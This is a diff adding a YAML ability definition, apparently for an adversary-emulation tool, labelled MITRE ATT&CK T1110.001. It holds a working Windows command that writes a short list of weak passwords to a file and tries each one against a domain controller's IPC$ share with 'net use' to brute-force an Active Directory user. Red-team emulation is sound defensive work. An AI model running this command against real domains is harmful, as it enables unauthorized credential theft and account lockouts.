@@ -1,0 +1,21 @@
+---
+- id: 09fc509d77ec1ce89738bedeac2e9e3a
+  name: Brute Force Credentials of single Active Directory domain users via SMB
+  description: 'Attempts to brute force a single Active Directory account by testing
+    connectivity to the IPC$ share on a domain controller
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
+  platforms:
+    windows:
+      cmd:
+        command: 'echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt &&
+          echo Password!>> passwords.txt && echo Spring2022>> passwords.txt && echo
+          ChangeMe!>> passwords.txt && @FOR /F "delims=" %p in (passwords.txt) DO
+          @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1
+          && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL'
+        payloads: []
+        cleanup: ''
